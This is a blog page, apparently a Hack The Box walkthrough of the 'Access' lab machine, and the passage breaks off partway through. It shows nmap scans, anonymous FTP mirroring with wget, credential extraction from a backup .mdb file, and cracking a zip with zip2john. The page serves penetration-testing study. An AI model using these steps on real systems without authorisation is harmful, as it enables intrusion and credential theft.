<!DOCTYPE html>
<html lang="en-us">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    
    <meta name="generator" content="Hugo 0.135.0">

    <script src="js/custom.js"></script>
    

    

    
        
            <meta
                name="description"
                content="Saucy Monk" />
        

        
            <meta
                name="keywords"
                content="hacking, AD" />
        

        
            <meta name="author" content="bloodstiller" />
        

    


    <title>
        
            Access HTB Walkthrough |
            Hack the planet
        
    </title>

    


    
    

    
    


    
    


    
    


    
    

    


    
    

    

    

        
            
            <link
                rel="stylesheet"
                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/02_style.e6eadce601966e1bc2d798a6a4b94edc31360559ec0c7efd94e31d855914e918a88c9bddfabc11200357a22ce33ebdfd27c70fdd76cc8d155e9633bab42e0f76.css"
                integrity="sha512-5urc5gGWbhvC15impLlO3DE2BVnsDH79lOMdhVkU6RiojJvd&#43;rwRIANXoizjPr39J8cP3XbMjRVeljO6tC4Pdg==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
        

    


    
    

    

    

    

    


</head>



    <body>
        <header class="header">
    <div class="header_left">
        
    </div>

    <div class="header_middle">
        
            Access HTB Walkthrough -
            Hack the planet
        
    </div>
</header>



        <main>
            <aside class="sidebar">
    



    
    

    
    


    <ul class="section-tree">
        
            
                <li
                    
                        class="dir opened-dir"
                    >
                    <span class="dir-text"> Walkthroughs </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
                        
                            Escape HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
                        
                            Hospital HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
                        
                            Intelligence HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
                        
                            Manager HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
                        
                            Access HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
                        
                            Remote HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
                        
                            Support HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
                        
                            Return HTB Box Walkthrough
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/scrambled-box/" title="./scrambled-box/">
                        
                            Scrambled HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
                        
                            about me
                        
                    </a>
                </li>
            
        
    </ul>


</aside>
<aside class="exapandable"></aside>


            
    <article class="main">
        <button
    class="sidebar-toggle-btn"
    type="menu"
    aria-expanded="false"
    aria-haspopup="true">
    <i class="bi bi-list"></i>
</button>



        <div class="title">
            <h1 class="title-header">
                Access HTB Walkthrough
            </h1>

            <div class="author-date-readtime">
                

                    
                        <div class="author" title="Author">
                            <i class="bi bi-person"></i>
                            <a
                                href="/author/bloodstiller/"
                                class="cat-btn">
                                bloodstiller
                            </a>
                        </div>
                    

                

                
                    <div class="date" title="Date">
                        <i class="bi bi-calendar3"></i>
                        <time
                            datetime="2024.12.09"
                            >2024.12.09
                        </time>
                    </div>
                

                
                    <div
                        class="readtime"
                        title="Time to Read">
                        <i class="bi bi-clock"></i>
                        13 mins to read
                    </div>
                
            </div>
        </div>

        <div class="article-meta">
            

            
                <div class="tags">
                    <i
                        class="bi bi-tags"
                        title="Tags"></i>
                    
                        <a
                            href="/tags/box/"
                            class="tag-btn">
                            Box
                        </a>
                    
                        <a
                            href="/tags/htb/"
                            class="tag-btn">
                            HTB
                        </a>
                    
                        <a
                            href="/tags/easy/"
                            class="tag-btn">
                            Easy
                        </a>
                    
                        <a
                            href="/tags/windows/"
                            class="tag-btn">
                            Windows
                        </a>
                    
                        <a
                            href="/tags/pst/"
                            class="tag-btn">
                            pst
                        </a>
                    
                        <a
                            href="/tags/lnk/"
                            class="tag-btn">
                            lnk
                        </a>
                    
                        <a
                            href="/tags/telnet/"
                            class="tag-btn">
                            telnet
                        </a>
                    
                </div>
            

            
                <div class="breadcumb">
                    <i class="bi bi-folder"></i>
                    
    
    




<a href="http://localhost:1313/" class="bread-btn">
    
        <i class="bi bi-house-fill"></i>
    

    
        Home
    
</a>




    /



<a href="http://localhost:1313/walkthroughs/" class="bread-btn">
    

    
        Walkthroughs
    
</a>




    /



<a href="http://localhost:1313/walkthroughs/access-box/" class="bread-btn">
    

    
        
            Access HTB Walkthrough
        

    
</a>

                </div>
            

            
        </div>

        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#name-of-box-access-htb-walkthrough-writeup">Access Hack The Box Walkthrough/Writeup:</a></li>
    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
      <ul>
        <li><a href="#simple-nmap-to-get-a-view-of-low-hanging-fruit">Simple NMAP to get a view of low hanging fruit:</a></li>
        <li><a href="#advanced-all-ports-nmap-scan">Advanced All Ports NMAP Scan:</a></li>
        <li><a href="#http-enumeration">HTTP Enumeration:</a></li>
        <li><a href="#telnet-enumeration">Telnet Enumeration:</a></li>
        <li><a href="#ftp-enumeration">FTP Enumeration:</a></li>
        <li><a href="#backups-share-enumeration">Backups Share Enumeration:</a></li>
        <li><a href="#backup-dot-mdb-enumeration"><code>backup.mdb</code> enumeration:</a></li>
        <li><a href="#engineer-share-enumeration">Engineer Share Enumeration:</a></li>
        <li><a href="#viewing-contents-of-the-dot-pst-file">Viewing Contents of the <code>.pst</code> file:</a></li>
      </ul>
    </li>
    <li><a href="#2-dot-foothold">2. Foothold:</a>
      <ul>
        <li><a href="#system-info">System Info:</a></li>
        <li><a href="#shell-upgrade">Shell Upgrade:</a></li>
        <li><a href="#zteko-enumeration">ZTeko Enumeration:</a></li>
        <li><a href="#system-enumeration">System Enumeration:</a></li>
      </ul>
    </li>
    <li><a href="#3-dot-privesc">3. Privesc:</a>
      <ul>
        <li><a href="#cmdkey-list-discovery">cmdkey /list discovery:</a></li>
        <li><a href="#lnk-file-enumeration">lnk file enumeration:</a></li>
      </ul>
    </li>
    <li><a href="#4-dot-ownership">4. Ownership:</a></li>
    <li><a href="#5-dot-persistence">5. Persistence:</a></li>
    <li><a href="#lessons-learned">Lessons Learned:</a>
      <ul>
        <li><a href="#what-did-i-learn">What did I learn?</a></li>
        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
      </ul>
    </li>
    <li><a href="#sign-off">Sign off:</a></li>
  </ul>
</nav>
        


        <div class="content">
            
                <h2 id="name-of-box-access-htb-walkthrough-writeup">Access Hack The Box Walkthrough/Writeup:</h2>
<ul>
<li><a href="https://app.hackthebox.com/machines/Access">https://app.hackthebox.com/machines/Access</a></li>
</ul>
<h2 id="1-dot-enumeration">1. Enumeration:</h2>
<h3 id="simple-nmap-to-get-a-view-of-low-hanging-fruit">Simple NMAP to get a view of low hanging fruit:</h3>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%20~%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2019:30:03%20zsh%20%e2%9d%af%20nmap%20$box%20-Pn%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-09-09%2019:30%20BST%0aNmap%20scan%20report%20for%2010.129.199.196%0aHost%20is%20up%20%280.056s%20latency%29.%0aNot%20shown:%20997%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20STATE%20SERVICE%0a21/tcp%20open%20%20ftp%0a23/tcp%20open%20%20telnet%0a80/tcp%20open%20%20http%0a%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%2015.06%20seconds">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in ~  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>🕙 19:30:03 zsh ❯ nmap $box -Pn
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-09 19:30 BST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.199.196
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.056s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
</span></span><span style="display:flex;"><span>21/tcp open  ftp
</span></span><span style="display:flex;"><span>23/tcp open  telnet
</span></span><span style="display:flex;"><span>80/tcp open  http
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 15.06 seconds</span></span></code></pre></div>
    
</div>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-193422_.png">
</figure>
</li>
</ul>
<h3 id="advanced-all-ports-nmap-scan">Advanced All Ports NMAP Scan:</h3>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%2046-Boxes/46.02-HTB/Access/scans/nmap%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2019:29:41%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20--disable-arp-ping%20-Pn%20-oA%20FullTCP%20$box%0a[sudo]%20password%20for%20kali:%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-09-09%2019:30%20BST%0aNmap%20scan%20report%20for%2010.129.199.196%0aHost%20is%20up%20%280.040s%20latency%29.%0aNot%20shown:%2065532%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20STATE%20SERVICE%20VERSION%0a21/tcp%20open%20%20ftp%20%20%20%20%20Microsoft%20ftpd%0a%7c%20ftp-anon:%20Anonymous%20FTP%20login%20allowed%20%28FTP%20code%20230%29%0a%7c_Can%27t%20get%20directory%20listing:%20PASV%20failed:%20425%20Cannot%20open%20data%20connection.%0a%7c%20ftp-syst:%0a%7c_%20%20SYST:%20Windows_NT%0a23/tcp%20open%20%20telnet?%0a80/tcp%20open%20%20http%20%20%20%20Microsoft%20IIS%20httpd%207.5%0a%7c_http-title:%20MegaCorp%0a%7c_http-server-header:%20Microsoft-IIS/7.5%0a%7c%20http-methods:%0a%7c_%20%20Potentially%20risky%20methods:%20TRACE%0aWarning:%20OSScan%20results%20may%20be%20unreliable%20because%20we%20could%20not%20find%20at%20least%201%20open%20and%201%20closed%20port%0aDevice%20type:%20general%20purpose%7cphone%7cspecialized%0aRunning%20%28JUST%20GUESSING%29:%20Microsoft%20Windows%208%7cPhone%7c7%7c2008%7c8.1%7cVista%20%2892%25%29%0aOS%20CPE:%20cpe:/o:microsoft:windows_8%20cpe:/o:microsoft:windows%20cpe:/o:microsoft:windows_7%20cpe:/o:microsoft:windows_server_2008:r2%20cpe:/o:microsoft:windows_8.1%20cpe:/o:microsoft:windows_vista::-%20cpe:/o:microsoft:windows_vista::sp1%0aAggressive%20OS%20guesses:%20Microsoft%20Windows%208.1%20Update%201%20%2892%25%29,%20Microsoft%20Windows%20Phone%207.5%20or%208.0%20%2892%25%29,%20Microsoft%20Windows%20Embedded%20Standard%207%20%2891%25%29,%20Microsoft%20Windows%207%20or%20Windows%20Server%202008%20R2%20%2889%25%29,%20Microsoft%20Windows%20Server%202008%20R2%20%2889%25%29,%20Microsoft%20Windows%20Server%202008%20R2%20or%20Windows%208.1%20%2889%25%29,%20Microsoft%20Windows%20Server%202008%20R2%20SP1%20or%20Windows%208%20%2889%25%29,%20Microsoft%20Windows%207%20%2889%25%29,%20Microsoft%20Windows%207%20SP1%20or%20Windows%20Server%202008%20R2%20%2889%25%29,%20Microsoft%20Windows%207%20SP1%20or%20Windows%20Server%202008%20SP2%20or%202008%20R2%20SP1%20%2889%25%29%0aNo%20exact%20OS%20matches%20for%20host%20%28test%20conditions%20non-ideal%29.%0aService%20Info:%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0a%0aOS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20382.99%20seconds">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in 46-Boxes/46.02-HTB/Access/scans/nmap  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>🕙 19:29:41 zsh ❯ sudo nmap -p- -sV -sC -O --disable-arp-ping -Pn -oA FullTCP $box
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-09 19:30 BST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.199.196
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.040s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>21/tcp open  ftp     Microsoft ftpd
</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t get directory listing: PASV failed: <span style="color:#ae81ff">425</span> Cannot open data connection.
</span></span><span style="display:flex;"><span>| ftp-syst:
</span></span><span style="display:flex;"><span>|_  SYST: Windows_NT
</span></span><span style="display:flex;"><span>23/tcp open  telnet?
</span></span><span style="display:flex;"><span>80/tcp open  http    Microsoft IIS httpd 7.5
</span></span><span style="display:flex;"><span>|_http-title: MegaCorp
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/7.5
</span></span><span style="display:flex;"><span>| http-methods:
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
</span></span><span style="display:flex;"><span>Device type: general purpose|phone|specialized
</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 8|Phone|7|2008|8.1|Vista <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows 8.1 Update <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Phone 7.5 or 8.0 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Embedded Standard <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows 8.1 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 SP1 or Windows <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> SP1 or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> SP1 or Windows Server <span style="color:#ae81ff">2008</span> SP2 or <span style="color:#ae81ff">2008</span> R2 SP1 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 382.99 seconds</span></span></code></pre></div>
    
</div>
<ul>
<li>We can see that so far it&rsquo;s just the 3 services running, <code>FTP</code>, <code>telnet</code> &amp; <code>HTTP</code> &amp; that the system is mostly likely running windows 8</li>
</ul>
<h3 id="http-enumeration">HTTP Enumeration:</h3>
<ul>
<li>I run feroxbuster on the domain but the results are slim.
<ul>
<li>The page also appears to be a simple holding page.</li>
<li><figure><img src="/ox-hugo/2024-09-10-113901_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="telnet-enumeration">Telnet Enumeration:</h3>
<ul>
<li>
<p>Telnet Enumeration:</p>
<ul>
<li>Not really much here to be honest.</li>
</ul>
<!-- raw HTML omitted -->







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%2046-Boxes/46.02-HTB/Access/scans/nmap%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2019:31:45%20zsh%20%e2%9d%af%20nmap%20-n%20-sV%20-Pn%20--script%20%22*telnet*%20and%20safe%22%20-p%2023%20$box%20-oA%20telnetScan%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-09-10%2009:54%20BST%0aStats:%200:02:33%20elapsed;%200%20hosts%20completed%20%281%20up%29,%201%20undergoing%20Service%20Scan%0aService%20scan%20Timing:%20About%200.00%25%20done%0aNmap%20scan%20report%20for%2010.129.199.196%0aHost%20is%20up%20%280.036s%20latency%29.%0a%0aPORT%20%20%20STATE%20SERVICE%20VERSION%0a23/tcp%20open%20%20telnet?%0a%0aService%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20176.99%20seconds">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in 46-Boxes/46.02-HTB/Access/scans/nmap  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>🕙 19:31:45 zsh ❯ nmap -n -sV -Pn --script <span style="color:#e6db74">&#34;*telnet* and safe&#34;</span> -p <span style="color:#ae81ff">23</span> $box -oA telnetScan
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-10 09:54 BST
</span></span><span style="display:flex;"><span>Stats: 0:02:33 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
</span></span><span style="display:flex;"><span>Service scan Timing: About 0.00% <span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.199.196
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>23/tcp open  telnet?
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 176.99 seconds</span></span></code></pre></div>
    
</div>
</li>
</ul>
<h3 id="ftp-enumeration">FTP Enumeration:</h3>
<ul>
<li>I connect via FTP and can see there are shares available.
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-193527_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="backups-share-enumeration">Backups Share Enumeration:</h3>
<ul>
<li>
<p>I can see in the <code>Backups</code> share there is a file called <code>backup.mdb</code></p>
<blockquote>
<p>An MDB file is a database file created by Microsoft Access, a widely-used desktop relational database program. It contains the database structure (tables and fields) and database entries (table rows). MDB files may also store data entry forms, queries, stored procedures, reports, and database security settings.</p>
<p>More Information</p>
</blockquote>
<ul>
<li><strong>So this could be good as it could contain creds etc</strong>:
<ul>
<li>It&rsquo;s been replaced by the newer <code>.accdb</code> format. It could include basic password protection but the format lacks advanced encryption, making it less secure than newer formats.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>I try and download it using netexec, but it loses it&rsquo;s damn-mind</strong>:</p>
<ul>
<li>I figured I&rsquo;d try netexec&rsquo;s ftp download method, but that&rsquo;s what I get for trying something new I suppose.</li>
<li><figure><img src="/ox-hugo/2024-09-09-193929_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I then continue to have consistent issues with Passive mode</strong>:</p>
<ul>
<li>However there is a way around this and you can just download all of the data at once using wget:
<ul>
<li><strong>Command</strong>: wget -m –no-passive <a href="ftp://anonymous:anonymous@$box">ftp://anonymous:anonymous@$box</a></li>
<li><figure><img src="/ox-hugo/2024-09-09-195011_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="backup-dot-mdb-enumeration"><code>backup.mdb</code> enumeration:</h3>
<ul>
<li>
<p><strong>I run strings on the file and can see some interesting things like potential usernames/fields</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-195259_.png">
</figure>
</li>
</ul>
</li>
<li>
<p>I tried to open the file with dbeaver but for some reason it would not display correctly.</p>
</li>
<li>
<p><strong>There is luckily a probject called <code>mdbtools</code> we can use</strong>:</p>
<ul>
<li><a href="https://github.com/mdbtools/mdbtools">https://github.com/mdbtools/mdbtools</a></li>
<li><code>sudo apt install mdbtools</code></li>
</ul>
</li>
<li>
<p><strong>Find out how many tables &amp; their names</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-200827_.png">
</figure>

<ul>
<li>As we can see there is an entry called <code>auth_user</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>I dump this entry &amp; get 3 lots of creds</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-200924_.png">
</figure>
</li>
</ul>
</li>
<li>
<p>So we have 3 sets of creds, lets take a look at the other services share:</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li><strong>Alt options</strong>:
<ul>
<li>I find the website: <a href="https://www.mdbopener.com/">https://www.mdbopener.com/</a> which let you upload the file &amp; have it extract all the tables to <code>.csv</code> files.</li>
<li>+Note+: I WOULD NEVER DO THIS OR SUGGEST THIS ON AN ENGAGEMENT!!!!
<ul>
<li>But this is an option for this challenge/box. (I chose not too as I want to make it as close to life as possible for me)</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="engineer-share-enumeration">Engineer Share Enumeration:</h3>
<ul>
<li>
<p>There is a <code>.zip</code> file in here called <code>Access Control.zip</code></p>
</li>
<li>
<p><strong>I try and unzip but I am denied as it has access control on it which means password protection</strong></p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-201528_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I run file on it to ensure it&rsquo;s actually a <code>.zip</code> &amp; it is, encrypted with AES</strong>.</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-201620_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I run <code>zip2john</code> on it to generate a hash</strong>.</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-201705_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I run it through rockyou but get no hits</strong>.</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-201754_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I extract it in my gui and use one of the passwords I extracted from the</strong> <code>.mdb</code> <strong>&amp; it works</strong>!</p>
<ul>
<li>I am given a file called <code>Access Control.pst</code></li>
</ul>
</li>
</ul>
<h3 id="viewing-contents-of-the-dot-pst-file">Viewing Contents of the <code>.pst</code> file:</h3>
<ul>
<li><strong>What is a</strong> <code>.pst</code>:</li>
</ul>
<blockquote>
<p>A PST file is a data storage file that contains personal information used by Microsoft Outlook and Exchange. It may also include e-mail folders, contacts, addresses, and other data.</p>
</blockquote>
<ul>
<li>
<p>So this could hold even more valuable information!</p>
</li>
<li>
<p><strong>I switch to my Windows VM and download this software so I can view the contents of the</strong> <code>.pst</code>:</p>
<ul>
